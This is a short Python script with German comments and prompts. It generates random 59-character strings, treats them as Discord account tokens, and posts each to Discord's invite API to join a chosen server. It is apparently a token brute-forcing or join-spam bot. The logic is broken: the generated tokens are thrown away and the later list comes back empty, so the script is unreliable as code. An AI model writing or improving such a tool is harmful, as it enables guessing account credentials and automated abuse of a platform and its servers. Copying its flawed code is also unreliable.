import time
import threading
import random
import string
import requests
from colorama import Fore

# Farben für die Konsole
red = Fore.RED
green = Fore.GREEN
reset = Fore.RESET
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX

def generate_token():
    """Generiert ein zufälliges Token."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=59))

def join_server(token, invite_code):
    """Versucht, dem angegebenen Discord-Server mit dem gegebenen Token beizutreten."""
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    response = requests.post(f'https://discord.com/api/v9/invites/{invite_code}', headers=headers)
    if response.status_code == 200:
        print(f"{reset}[ {cyan}{time.strftime('%H:%M:%S')}{reset} ] {gray}({green}+{gray}) Dem Server erfolgreich beigetreten | Token: {token[:30]}*****")
    elif response.status_code == 403:
        print(f"{reset}[ {cyan}{time.strftime('%H:%M:%S')}{reset} ] {gray}({red}-{gray}) Zugriff verweigert | Token: {token[:30]}*****")
    else:
        print(f"{reset}[ {cyan}{time.strftime('%H:%M:%S')}{reset} ] {gray}({red}-{gray}) Fehler | Token: {token[:30]}*****")

def generate_tokens():
    """Generiert kontinuierlich Tokens."""
    tokens = []
    while not stop_event.is_set():
        tokens.append(generate_token())
        if len(tokens) % 10000 == 0:
            print(f"Generiert {len(tokens)} Tokens.")
    return tokens

def main():
    global stop_event
    invite_code = input("Bitte den Server-Invite-Code eingeben: ").strip()
    print("Tokens werden generiert... Drücke Enter, um zu stoppen.")
    
    # Starte die Token-Generierung in einem separaten Thread
    stop_event = threading.Event()
    token_thread = threading.Thread(target=generate_tokens)
    token_thread.start()
    
    # Warte auf die Eingabe des Benutzers, um die Token-Generierung zu stoppen
    input()
    stop_event.set()
    token_thread.join()
    
    print(f"Tokens generiert. Versuche, dem Server beizutreten...")
    tokens = generate_tokens()
    
    for token in tokens:
        join_server(token, invite_code)

if __name__ == "__main__":
    main()
